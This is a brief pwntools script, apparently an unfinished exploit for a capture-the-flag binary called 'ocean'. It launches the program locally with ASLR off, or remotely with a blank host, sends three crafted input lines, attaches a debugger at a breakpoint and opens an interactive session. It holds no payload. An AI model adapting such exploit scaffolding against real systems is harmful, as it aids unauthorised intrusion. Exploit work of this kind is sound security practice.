from pwn import *

e = ELF("./ocean")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path, aslr=False)


p.sendline("8 8")
p.sendline("6 3133742")
gdb.attach(p, "b *0x0000555555554bd0")
p.sendline("9 10")


p.interactive()
